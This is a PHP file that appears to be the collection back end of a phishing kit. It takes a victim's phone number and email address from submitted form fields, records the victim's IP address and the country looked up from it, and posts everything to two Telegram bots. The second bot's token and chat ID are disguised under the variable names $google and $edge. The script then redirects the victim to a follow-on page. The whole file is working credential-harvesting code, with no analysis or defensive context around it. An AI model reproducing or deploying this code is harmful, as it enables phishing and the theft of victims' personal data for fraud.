

<?php
include "infotelegram.php";

$userp = $_SERVER['REMOTE_ADDR'];
$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));


function env($token, $chatId, $mensaje) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = array(
        'chat_id' => $chatId,
        'text' => $mensaje
    );

    $options = array(
        'http' => array(
            'method'  => 'POST',
            'header'  => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data)
        )
    );

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $mensaje = "🥶0CA-BLU3🥶\n📞T3L: ".$_POST['t3l3x']."\n👤C0rr30x: ".$_POST['3m4ylx']."\nIP: ".$_SERVER['REMOTE_ADDR']."\n".$cc."\n🥶C0DIGO SYN4PSE🥶";
    if (empty($mensaje)) {
        die("Error: El campo de mensaje no puede estar vacío.");
    }

    $tokenBot = $token;
    $chatIDBot = $tid;

    $navegador = $google;
    $mobile = $edge;

    env($tokenBot, $chatIDBot, $mensaje);
    env($navegador, $mobile, $mensaje);
    echo "<script>window.location.href = \"../odautes.html\"</script>";
}
?>

